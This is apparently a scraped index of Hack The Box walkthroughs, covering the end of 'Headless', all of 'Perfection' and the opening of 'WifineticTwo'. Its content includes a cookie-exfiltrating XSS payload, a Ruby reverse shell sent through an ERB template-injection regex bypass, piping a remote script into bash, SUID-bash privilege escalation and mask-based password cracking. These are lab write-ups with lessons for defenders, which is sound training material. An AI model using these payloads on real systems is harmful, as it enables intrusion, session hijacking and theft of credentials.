XSS Let&rsquo;s consider the Hacking Attempt Detected message for a second:
Your IP address has been flagged, a report with your browser information has been sent to the administrators for investigation.
Oh, so an administrator might be reading the output of this? Sounds like a great opportunity for XSS. Let&rsquo;s craft a payload. First, examine where the text gets reflected:
&lt;pre&gt; &lt;strong&gt;Method:&lt;/strong&gt; POST&lt;br&gt; &lt;strong&gt;URL:&lt;/strong&gt; http://10.10.11.8:5000/support&lt;br&gt; &lt;strong&gt;Headers:&lt;/strong&gt; &lt;strong&gt;Host:&lt;/strong&gt; 10.10.11.8:5000&lt;br&gt; &lt;strong&gt;User-Agent:&lt;/strong&gt; Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&lt;br&gt; &lt;strong&gt;Accept:&lt;/strong&gt; text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;br&gt; &lt;strong&gt;Accept-Language:&lt;/strong&gt; en-US,en;q=0.5&lt;br&gt; &lt;strong&gt;Accept-Encoding:&lt;/strong&gt; gzip, deflate, br&lt;br&gt; &lt;strong&gt;Content-Type:&lt;/strong&gt; application/x-www-form-urlencoded&lt;br&gt; &lt;strong&gt;Content-Length:&lt;/strong&gt; 91&lt;br&gt; &lt;strong&gt;Origin:&lt;/strong&gt; http://10.10.11.8:5000&lt;br&gt; &lt;strong&gt;Dnt:&lt;/strong&gt; 1&lt;br&gt; &lt;strong&gt;Connection:&lt;/strong&gt; close&lt;br&gt; &lt;strong&gt;Referer:&lt;/strong&gt; http://10.10.11.8:5000/support&lt;br&gt; &lt;strong&gt;Cookie:&lt;/strong&gt; is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs&lt;br&gt; &lt;strong&gt;Upgrade-Insecure-Requests:&lt;/strong&gt; 1&lt;br&gt;&lt;strong&gt;Sec-Gpc:&lt;/strong&gt; 1&lt;br&gt; &lt;br&gt; &lt;/pre&gt; Most of these fields are user-controllable, but the ones with least restriction to them are inevitably the cookie and the user-agent. Since the user-agent can be literally anything, let&rsquo;s play with that first.
The reflected text&rsquo;s only parent is the &lt;pre&gt; node, so I should be able to just introduce a new element.
Also, for successful XSS we&rsquo;ll need something to catch the data exfiltrated. For this, I&rsquo;ll use a simple python webserver:
sudo ufw allow from $RADDR to any port 8000 proto tcp python3 -m http.server 8000 Now, let&rsquo;s send a simple &ldquo;redirect&rdquo; XSS to the target, using the User-Agent header:
To my delight, after a few seconds of waiting, the &ldquo;administrator&rdquo; took a peek, and was redirected!
Fantastic, so we now have the administrator&rsquo;s cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
I&rsquo;ll try navigating to the /dashboard page and swap out the cookie for this one:
This worked perfectly!
I&rsquo;ll copy the cookie into my browser so I don&rsquo;t have to keep proxying it.
Aside: XSS local testing I&rsquo;ll admit&hellip; I&rsquo;m horrendously bad at XSS right now. To be honest, I&rsquo;ve only used it once or twice. To get the stuff from the previous section to work, I had to test it locally first. This was my test environment:
Python http.server running locally, awaiting connections from the target An html file containing my XSS payload. I would then load the html file in my browser, and check the http.server to see if it had a hit.
The html file was as follows. Note that I was testing the XSS in two places - the &lt;script&gt; at the bottom, and the &lt;span&gt; reflecting the user agent:
&lt;!DOCTYPE html&gt; &lt;html lang=&#34;en&#34;&gt; &lt;head&gt; &lt;meta charset=&#34;UTF-8&#34;&gt; &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt; &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;ie=edge&#34;&gt; &lt;title&gt;XSS Test Page&lt;/title&gt; &lt;script&gt; function setCookie(name, value) { var date = new Date(); date.setTime(date.getTime() + (365 * 24 * 60 * 60 * 1000)); var expires = &#34;; expires=&#34; + date.toUTCString(); document.cookie = name + &#34;=&#34; + (value || &#34;&#34;) + expires + &#34;; path=/&#34;; } window.onload = function() { setCookie(&#34;is_admin&#34;, &#34;yougotme...yay!&#34;); document.getElementById(&#39;userAgent&#39;).innerText = navigator.userAgent; }; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;main&gt; &lt;h1&gt;Welcome to My Website&lt;/h1&gt; &lt;ul&gt;&lt;li&gt; &lt;h3&gt;XSS via user agent test&lt;/h3&gt; &lt;p class=&#34;note-text&#34;&gt;User Agent: &lt;span id=&#34;userAgent&#34;&gt;&lt;/span&gt;&lt;/p&gt; &lt;/li&gt;&lt;/ul&gt; &lt;/main&gt; &lt;script&gt;document.location=&#34;http://127.0.0.1:8000/hello?c=&#34;+document.cookie;&lt;/script&gt; &lt;/body&gt; USER FLAG Gaining RCE Now that we&rsquo;ve found a way into the /dashboard, let&rsquo;s figure out how to turn this into RCE - or if it&rsquo;s possible. Let&rsquo;s examine the request that occurs when we click Generate Report:
Interesting. That&rsquo;s a format that pretty much anything could use. If we&rsquo;re extra lucky, it&rsquo;s just getting interpreted by the shell, probably to write to some kind of log file or be part of a filename using the date function.
Just in case, I&rsquo;ll start up a reverse shell listener:
sudo ufw allow from $RADDR to any port 4444 proto tcp bash socat -d TCP_LISTEN:4444 STDOUT Now let&rsquo;s try sending a really simple reverse shell payload. I&rsquo;ll URL-encode the highlighted bit below:
Wow - this must be my lucky day!
If I&rsquo;m not mistaken, dvir is the name of the box creator.
Fantastic. Let&rsquo;s search for the user flag:
It&rsquo;s in the home directory, so just cat it for the points &#x1f389;
cat /home/dvir/user.txt SSH Connection To get a little more comfortable, I&rsquo;ll switch to SSH.
# On the attacker machine: ssh-keygen -t rsa -b 4096 # used passphrase p1geon chmod 700 ./id_rsa base64 -w 0 id_rsa.pub | tee id_rsa.pub64 # On the target machine: echo &#39;c3NoLXJ....bGkK&#39; | base64 -d &gt;&gt; ~/.ssh/authorized_keys # On attacker machine: ssh -i ./id_rsa dvir@$RADDR Hmm, looks like I have some mail waiting for me:
ROOT FLAG Checking the mail Mail should be in /var/mail/$USER:
cat /var/mail/dvir Subject: Important Update: New System Check Script Hello! We have an important update regarding our server. In response to recent compatibility and crashing issues, we&#39;ve introduced a new system check script. What&#39;s special for you? - You&#39;ve been granted special privileges to use this script. - It will help identify and resolve system issues more efficiently. - It ensures that necessary updates are applied when needed. Rest assured, this script is at your disposal and won&#39;t affect your regular use of the system. If you have any questions or notice anything unusual, please don&#39;t hesitate to reach out to us. We&#39;re here to assist you with any concerns. By the way, we&#39;re still waiting on you to create the database initialization script! Best regards, Headless To find this rapidly, I checked using linpeas:
curl -s http://10.10.14.19:8000/linpeas.sh | bash Found it without too much trouble. This must be what the email was referring to:
User dvir may run the following commands on headless: (ALL) NOPASSWD: /usr/bin/syscheck I&rsquo;ll try running it:
Maybe I can read it and see what it&rsquo;s up to:
#!/bin/bash if [ &#34;$EUID&#34; -ne 0 ]; then exit 1 fi last_modified_time=$(/usr/bin/find /boot -name &#39;vmlinuz*&#39; -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1) formatted_time=$(/usr/bin/date -d &#34;@$last_modified_time&#34; +&#34;%d/%m/%Y %H:%M&#34;) /usr/bin/echo &#34;Last Kernel Modification Time: $formatted_time&#34; disk_space=$(/usr/bin/df -h / | /usr/bin/awk &#39;NR==2 {print $4}&#39;) /usr/bin/echo &#34;Available disk space: $disk_space&#34; load_average=$(/usr/bin/uptime | /usr/bin/awk -F&#39;load average:&#39; &#39;{print $2}&#39;) /usr/bin/echo &#34;System load average: $load_average&#34; if ! /usr/bin/pgrep -x &#34;initdb.sh&#34; &amp;&gt;/dev/null; then /usr/bin/echo &#34;Database service is not running. Starting it...&#34; ./initdb.sh 2&gt;/dev/null else /usr/bin/echo &#34;Database service is running.&#34; fi exit 0 &#x1f602; Ok, I see the vulnerable line. It&rsquo;s the call to ./initdb.sh 2&gt;/dev/null. This line uses only a relative path, yet I can run this script from anywhere. I&rsquo;ll just cook up a script to copy over an SUID bash, saving it as make_suid_bash.sh:
#!/bin/bash cp /usr/bin/bash /tmp/.Tools/bash chmod u+s /tmp/.Tools/bash Now I&rsquo;ll download it onto the target and call it initdb.sh:
mkdir -p /tmp/.Tools curl -o initdb.sh http://10.10.14.19:8000/make_suid_bash.sh chmod +x initdb.sh Everything is in place now - I just need to run it:
There&rsquo;s the SUID bash! Run it with -p to gain a root shell:
&#x1f609; That&rsquo;s all. Just cat the root flag to finish off the box:
cat /root/root.txt LESSONS LEARNED Attacker &#x1f52c; Test locally as much as you want. This box was a great refresher in some basic XSS techniques for me. It&rsquo;s not something I do often, so the practice was welcome. As such, I had to scrap together a quick test system to try to perform XSS on a site made to mimic the target. No shame in that - all practice is good.
&#x1f40c; Start an SSH connection even if you don&rsquo;t strictly need to. On this box, logging in via SSH prompted us to check our mail. This is one tiny benefit of using SSH. Another benefit is that, if SSHd is already running on the target, it&rsquo;s a lot more stealthy to connect to a port explicitly granting access, instead of some ludicrous-looking shell being passed through TCP port 4444! &#x1f602;
Defender &#x203c;&#xfe0f; Exceptional cases matter just as much as the &ldquo;normal&rdquo; operation of a system, when considering security. While the administrators had cleverly included mechanisms to catch XSS and SSTI attempts, they introduced the very vulnerability they were trying to patch by displaying the exceptional case to the user.
&#x1f6b3; Know what code is trusted, and what is not. Think of all of the code that can be ran as root by a low-privilege user as being functionally the same as code that can only be ran by root. On this box, privesc to root was easy because there was some code being ran from a sudo-able script, where that code was user-editable! Anything that can be ran by root should be in /usr/sbin or something similarly locked-down. Mind your permissions, please!
`,url:"https://4wayhandshake.github.io/walkthrough/headless/"},"https://4wayhandshake.github.io/walkthrough/perfection/":{title:"Perfection",tags:["SSTI","Regex Bypass","Ruby","Password Cracking"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION Perfection was released as the 9th box of HTB&rsquo;s Season IV, &ldquo;Savage Lands&rdquo;, but I&rsquo;m coming to it two weeks late. I really enjoyed this box, even though it was quite easy. I always appreciate when the box creator builds a little bit of a narrative around the box: in this case, we were dealing with a small school and the interaction between two people (shown on the About Us page) regarding the school&rsquo;s computer systems. There weren&rsquo;t too many distractions on this one: if you know what you&rsquo;re looking at, the solution for all steps should be readily apparent.
There is negligible recon required - the only useful recon being some cursory nmap scans. If you play around with the website a little, the vulnerability stands out very clearly, as does the fact that they failed to patch or mitigate its risk. Exploiting this was the only part where I was temporarily thwarted (but I&rsquo;ve since corrected that, and have added better checklists to my routine.)
Once exploiting for an initial foothold, there is very little required for this box. Frankly, you won&rsquo;t even need to run any privesc enumeration tools for this one - just do the usual first steps to user enumeration manually, and you&rsquo;ll see the correct information right away. One tip: after gaining foothold, go ahead and make an SSH connection instead - this will help the next step to stand out very clearly. After that, some really simple hash-cracking get&rsquo;s you what you need to escalate to root.
&#x1f606; This box was pretty entertaining - I&rsquo;ll definitely be recommending it to any beginners I meet. Thanks, @TheHated1!
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA) |_ 256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519) 80/tcp open http nginx |_http-title: Weighted Grade Calculator Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No results from the vuln scan.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
Not shown: 82 closed udp ports (port-unreach) PORT STATE SERVICE VERSION 7/udp open|filtered echo 68/udp open|filtered tcpwrapped 69/udp open|filtered tftp 80/udp open|filtered http 177/udp open|filtered xdmcp 427/udp open|filtered svrloc 999/udp open|filtered tcpwrapped 1025/udp open|filtered blackjack 1434/udp open|filtered ms-sql-m 1718/udp open|filtered tcpwrapped 2000/udp open|filtered tcpwrapped 3456/udp open|filtered tcpwrapped 32769/udp open|filtered filenet-rpc 32771/udp open|filtered sometimes-rpc6 49188/udp open|filtered unknown 49191/udp open|filtered unknown 49192/udp open|filtered unknown 49200/udp open|filtered unknown Note that any open|filtered ports are either open or (much more likely) filtered.
Webserver Strategy Noting the redirect from the nmap scan, I added download.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=perfection.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR Interesting - you don&rsquo;t often see Ruby webservers. According to their official page, current Ruby version roughly 3.3.0. WEBrick latest is at 1.8.1, so this one is a little out of date.
Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v As expected, no result. I wasn&rsquo;t expecting anything though. Just for completeness, I&rsquo;ll check for subdomains of perfection.htb
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v No new results from that. I&rsquo;ll move on to directory enumeration on http://perfection.htb:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 2 -c -o ffuf-directories-root -of json -e php,asp,js,html -timeout 4 -v Directory enumeration against http://[domain].htb/ gave the following:
Exploring the Website I often like to check the page footer first, to see if they&rsquo;re using any open-source projects that I can look up:
It looks like Secure Student Tools is just fictional. The description for Tina on the /about page adds a little flavor:
&ldquo;The web developer of our team, Tina is a Computer Science major at Acme University and a bright mind. She was the one who came up with the entire idea for the vision of Secure Student Tools™. She is an absolute whiz at web development, but she hasn&rsquo;t delved into secure coding too much.&rdquo;
The /weighted-grade page seems to be the only interactive part of the website. Oddly, the form validation forces you to fill in all five rows:
It didn&rsquo;t like the way that I submitted that data:
The form seems to prevent you from doing something like this:
The client-side validation doesn&rsquo;t like that. &#x1f644; Fine. I put 100% on one, and 0% on the rest:
Ok, that&rsquo;s interesting. It reflects the values back at us. Might be worth testing if I can do an SSTI for Ruby:
&#x1f639; Nope, it didn&rsquo;t like that either:
This makes me think I&rsquo;m probably on the right track. This error message suggests to me that they&rsquo;re using some kind of filter or deny-list to detect what is &ldquo;malicious&rdquo;. If it were actually secure code, it would just escape everything properly and parse the escaped text into the template.
FOOTHOLD Figure out the filter EDIT: Since stumbling on this part of the box, I decided to write a short guide/checklist on doing bypasses of various kinds. Please see /strategy/filter-bypass/ for more detail.
One of the methods I describe in that strategy will work for this box. It&rsquo;s one of the simpler ones, too.
I&rsquo;ll try some filter bypasses to try to circumvent this. I&rsquo;ll switch to Burp (partially because I won&rsquo;t have to fill out the form over and over, partially because I might need to play with some of the http headers).
The SSTI page on PayloadAllTheThings suggests that the template engine is probably either ERB or Slim, so let&rsquo;s isolate which of these characters are bad: }#{&gt;%=&lt;
&lt;%= 7 * 7 %&gt; # ERB #{ 7 * 7 } # Slim I tried these characters in place of one of the &ldquo;category&rdquo; of row 5:
Then repeatedly submitted those characters, removing one each time. If it showed &ldquo;Malicious input blocked&rdquo; all the way until the last character, I&rsquo;d remove that one from the list and start again&hellip; until I tried all of them.
The result: all of them are &ldquo;bad&rdquo;. In fact, it seems like every &ldquo;special character&rdquo; is considered bad.
Then, I did a little reading for ideas and started trying all kinds of other things. Here are some of the sources I read:
PayloadAllTheThings on Filter Bypass for XSS This blog post by Ally Petitt on WAF bypasses &#x2b50; This HackTricks page on Linux filter bypasses (just for ideas) This blog post by David Hamann on bypassing filter regexes &#x2b50; A non-exhaustive list of all the things I tried includes:
url-encoding, double url-encoding using unicode for all special characters Forcing alternative charsets using the Content-Type: application/x-www-form-urlencoded;charset=ibm037 trick many, many more. And the winner was&hellip; &#x1f941;
Linefeed! Yes, a single newline character did the trick. As alluded-to in the two articles I marked with a &#x2b50; above, using a newline character is enough to bypass the regex:
This payload is just a url-encoded version of \\n&lt;%= 7 * 7 %&gt;
PAYLOAD=&#39;%0a%3c%25%3d+7+%2a+7+%25%3e&#39; BODY=&#34;category1=Compooterss&amp;grade1=90&amp;weight1=20&amp;category2=English&amp;grade2=90&amp;weight2=20&amp;category3=Speeling&amp;grade3=90&amp;weight3=20&amp;category4=Artt&amp;grade4=90&amp;weight4=20&amp;category5=SSTI$PAYLOAD&amp;grade5=90&amp;weight5=20&#34; curl -sd &#34;$BODY&#34; http://perfection.htb/weighted-grade-calc | grep -A 1 -E &#39;Malicious|SSTI&#39; How does this work? It turns out that a popular mistake or shortcoming of regex modules is that they lack multi-line support. They&rsquo;ll only parse a single line of text. So by inserting a newline before any of the &ldquo;bad&rdquo; characers, the regex filter is bypassed.
Gain RCE Technically, the SSTI proof-of-concept is RCE. But how can we use this to get a shell on the target? It seems like the easiest way is to simply send a Ruby reverse shell inside the SSTI. Here&rsquo;s the reverse shell I&rsquo;ll use:
spawn(&#34;sh&#34;,[:in,:out,:err]=&gt;TCPSocket.new(&#34;10.10.14.19&#34;,4444)) But first, I&rsquo;ll open up a port in my firewall and start a reverse shell listener:
sudo ufw allow from $RADDR to any port 4444 proto tcp bash socat -d TCP-LISTEN:4444 STDOUT Now let&rsquo;s URL-encode the reverse shell. Here&rsquo;s a little python script to do it, but Burp would work fine too:
#!/bin/env python3 import sys import urllib.parse as ul s = sys.argv[1] print(s) print(ul.quote_plus(s)) ./url-encode.py &#39;spawn(&#34;sh&#34;,[:in,:out,:err]=&gt;TCPSocket.new(&#34;10.10.14.19&#34;,4444))&#39; # spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.14.19%22%2C4444%29%29 Great, now we just need to send it to the target. I&rsquo;m taking the SSTI from above and just replacing the &lsquo;7 * 7&rsquo; with the url-encoded reverse shell:
PAYLOAD=&#39;%0a%3c%25%3d+spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.14.19%22%2C4444%29%29+%25%3e&#39; BODY=&#34;category1=Compooterss&amp;grade1=90&amp;weight1=20&amp;category2=English&amp;grade2=90&amp;weight2=20&amp;category3=Speeling&amp;grade3=90&amp;weight3=20&amp;category4=Artt&amp;grade4=90&amp;weight4=20&amp;category5=SSTI$PAYLOAD&amp;grade5=90&amp;weight5=20&#34; curl -sd &#34;$BODY&#34; http://perfection.htb/weighted-grade-calc | grep -A 1 -E &#39;Malicious|SSTI&#39; And there we have it, a reverse shell:
&#x1f440; Oh? susan is in the sudo group? Privesc might be pretty easy.
USER FLAG Upgrade the shell Since this is just sh, let&rsquo;s upgrade this shell quickly:
which python python3 php perl bash # python3 and bash are present python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; [Ctrl+Z] stty raw -echo; fg [Enter] [Enter] export TERM=xterm-256color stty rows 48 columns 197 # from stty -a Get the flag Let&rsquo;s find out where the flag is, and see if we can read it directly:
find / -name &#39;user.txt&#39; 2&gt;/dev/null Perfect, it&rsquo;s in the home directory for susan. Just read the flag for some points
cat /home/susan/user.txt ROOT FLAG Change to SSH To get a little more comfortable, I&rsquo;ll switch to SSH.
# On the attacker machine: ssh-keygen -t rsa -b 4096 # used passphrase parr0t chmod 700 ./id_rsa base64 -w 0 id_rsa.pub | tee id_rsa.pub64 # On the target machine: mkdir -p ~/.ssh echo &#39;c3NoLXJ....bGkK&#39; | base64 -d &gt;&gt; ~/.ssh/authorized_keys # On attacker machine: ssh -i ./id_rsa susan@$RADDR &#x1f602; What? Susan appears to have mail. Let&rsquo;s check it out:
cat /var/mail/susan &ldquo;Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials (&lsquo;our&rsquo; including the other students in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:
{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}
Note that all letters of the first name should be convered into lowercase. Please hit me with updates on the migration when you can. I am currently registering our university with the platform.
- Tina, your delightful student&rdquo;
Alright, that seems useful! Taking a quick look at /etc/passwd doesnt seem like there&rsquo;s anyone except root to pivot to. However, there is a directory called Migration in susan&rsquo;s home directory. Possibly related? Let&rsquo;s grab a copy:
scp -i ./id_rsa susan@$RADDR:/home/susan/Migration/pupilpath_credentials.db ./pupilpath_credentials.db The database has only one table inside
Those look like password hashes. Let&rsquo;s dump them into a file. Since susan is the only one of these names that actually appears in /etc/passwd, I&rsquo;m only going to try to crack that one:
echo -n &#39;abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f&#39; &gt; susan.hash I also tossed this hash into name-that-hash. It had some guesses about the most likely formats:
From the email, we know the format of the password: it should be susannasus######### (where each # is a digit).
So let&rsquo;s try a mask attack with john:
john --mask=susan_nasus_?d?d?d?d?d?d?d?d?d --fork=4 susan.hash Nice! It cracked in a matter of seconds.
Now that we have a password for susan, we can finally check what is available with sudo:
Oh, everything is available? Well, that couldn&rsquo;t be easier!
Just cat out the flag for some of the easiest root flag points you&rsquo;ve ever seen &#x1f61c;
cat /root/root.txt EXTRA CREDIT What was the regex anyway? I was stuck at the SSTI step of this box for longer than I care to admit. Let&rsquo;s see what was stopping me. The code is in /home/susan/ruby_app/main.rb:
post &#39;/weighted-grade-calc&#39; do total_weight = params[:weight1].to_i + params[:weight2].to_i + params[:weight3].to_i + params[:weight4].to_i + params[:weight5].to_i if total_weight != 100 @result = &#34;Please reenter! Weights do not add up to 100.&#34; erb :&#39;weighted_grade_results&#39; elsif params[:category1] =~ /^[a-zA-Z0-9\\/ ]+$/ &amp;&amp; params[:category2] =~ /^[a-zA-Z0-9\\/ ]+$/ &amp;&amp; params[:category3] =~ /^[a-zA-Z0-9\\/ ]+$/ &amp;&amp; params[:category4] =~ /^[a-zA-Z0-9\\/ ]+$/ &amp;&amp; params[:category5] =~ /^[a-zA-Z0-9\\/ ]+$/ &amp;&amp; params[:grade1] =~ /^(?:100|\\d{1,2})$/ &amp;&amp; params[:grade2] =~ /^(?:100|\\d{1,2})$/ &amp;&amp; params[:grade3] =~ /^(?:100|\\d{1,2})$/ &amp;&amp; params[:grade4] =~ /^(?:100|\\d{1,2})$/ &amp;&amp; params[:grade5] =~ /^(?:100|\\d{1,2})$/ &amp;&amp; params[:weight1] =~ /^(?:100|\\d{1,2})$/ &amp;&amp; params[:weight2] =~ /^(?:100|\\d{1,2})$/ &amp;&amp; params[:weight3] =~ /^(?:100|\\d{1,2})$/ &amp;&amp; params[:weight4] =~ /^(?:100|\\d{1,2})$/ &amp;&amp; params[:weight5] =~ /^(?:100|\\d{1,2})$/ @result = ERB.new(&lt;SNIP&gt;).result(binding) erb :&#39;weighted_grade_results&#39; else @result = &#34;Malicious input blocked&#34; erb :&#39;weighted_grade_results&#39; end end Ok, so the regex is just this:
params[:category5] =~ /^[a-zA-Z0-9\\/ ]+$/ Literally all it does is check that it&rsquo;s alphanumeric or slash or space, and cant be empty. Yikes, that makes me feel a little stupid.
LESSONS LEARNED Attacker Keep a checklist of filter bypasses on-hand. After doing this box, I went and wrote myself a short list of them. Naturally, each scenario you encounter will require different bypass techniques, but I tried to write down a few to get the creative juices flowing. Please see /strategy/filter-bypass for more detail.
Think like a better developer. This can be tricky, because usually you&rsquo;re up against a team of well-trained developers that have been writing secure code for a long time. But sometimes, like in this case, you&rsquo;re up against a novice, who doesn&rsquo;t know how to code securely. I&rsquo;m glad I picked up on the hints that pointed in this direction: such as getting an error message of &ldquo;Malicious input blocked&rdquo; instead of simply using proper code escapes in the Sinatra template.
Keep the alternate uses of john/hashcat in mind. My initial reaction when cracking the passwords was to generate a wordlist containing all of the possible number suffixes. After a minute or so of waiting of that epic 10GiB file to write, I realized &ldquo;oh, this is perfect for a mask attack&rdquo;. Realizing that, I stopped writing the wordlist and cracked the password in seconds.
Defender Template injection is always preventable. Use proper escapes for the template. SSTIs can be very dangerous. Usually template engines are quite forceful in guiding you to do it the correct way - follow the documentation!
Use pre-written regexes. Writing bulletproof regexes is really hard. It&rsquo;s best to rely on more field-tested ones that others have written, instead of trying to reinvent the wheel. Consider using websites like https://regexlib.com or https://regex101.com/library.
Keep secrets out of mail. Even if it wasn&rsquo;t just /var/mail, mail servers are really popular targets. It&rsquo;s best to keep secrets out of them, such as your formula for password generation. Without the hint in /var/mail, it would have been a little more difficult to crack the hashes I needed.
High-privilege accounts should be treated specially. On this box, susan had full sudo access to the whole machine. I understand why - as the admin, it&rsquo;s kind of a convenience thing (I&rsquo;m not saying it&rsquo;s right, I&rsquo;m just saying I understand.) However, when we have such a high-privilege user, they should have special safeguards on their account. Giving susan the same security as any of the low-privilege students was a big mistake!
`,url:"https://4wayhandshake.github.io/walkthrough/perfection/"},"https://4wayhandshake.github.io/walkthrough/wifinetictwo/":{title:"WifineticTwo",tags:["OpenPLC","WPS","Pixie Dust","Default Credentials","Nmap"],categories:["Walkthrough","HTB","Linux","Medium"],content:`INTRODUCTION As the 11th box of HTB&rsquo;s Season IV, &ldquo;Savage Lands&rdquo;, WifineticTwo was released mid-March 2024. Although it&rsquo;s officially rated as medium difficulty, it&rsquo;s definitely on the easier side of medium. The skills required to root this box are pretty minimal, but it does require a little out of the box thinking. This box was a lot of fun, in the end. Take the name as a hint &#x1f609;
Upon starting the box, OpenPLC is the first thing you&rsquo;ll notice. It&rsquo;s archived software, used for turning various devices into software-based PLCs - things like Arduinos and Raspberry Pis, where you can get pin-by-pin access to inputs and outputs. Thankfully though, it also supports x86 Linux architecture, which will lead into an easy initial foothold. Just read about prior exploits for this software and you&rsquo;ll have a shell in no time. First blood for the user flag on this box took less than 8 minutes. Frankly, I didn&rsquo;t even follow my usual recon procedure, because the exploit to gain foothold seemed readily apparent.
Once you have a foothold, the user flag is present right away (part of the reason why this felt like an &ldquo;easy&rdquo; box). No need to enumerate very much: the way forward should be quite obvious. However, actually executing the steps required can be conceptually difficult: anyone who&rsquo;s tried similar procedures has (almost inevitably) done this from their own machine, not as a pivot. When you think you&rsquo;ve found the way forward, but aren&rsquo;t sure how you&rsquo;ll do it, I recommend reading the pertinent section of this guide to avoid the pitfalls that I encountered, which were just a big waste of time in the end. After that, the rest of the box will be very simple, especially if you&rsquo;ve played around with this topic before, such as setting up a headless Raspberry Pi.
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 8080/tcp open http-proxy Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 8080/tcp open http-proxy Werkzeug/1.0.1 Python/2.7.18 |_http-server-header: Werkzeug/1.0.1 Python/2.7.18 | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 NOT FOUND | content-type: text/html; charset=utf-8 | content-length: 232 | vary: Cookie | set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.ZfnVkg.r0NSCAEVwBMvIGd1INwNHuskFTU; Expires=Tue, 19-Mar-2024 18:17:34 GMT; HttpOnly; Path=/ | server: Werkzeug/1.0.1 Python/2.7.18 | date: Tue, 19 Mar 2024 18:12:34 GMT | &lt;!DOCTYPE HTML PUBLIC &#34;-//W3C//DTD HTML 3.2 Final//EN&#34;&gt; | &lt;title&gt;404 Not Found&lt;/title&gt; | &lt;h1&gt;Not Found&lt;/h1&gt; | &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt; | 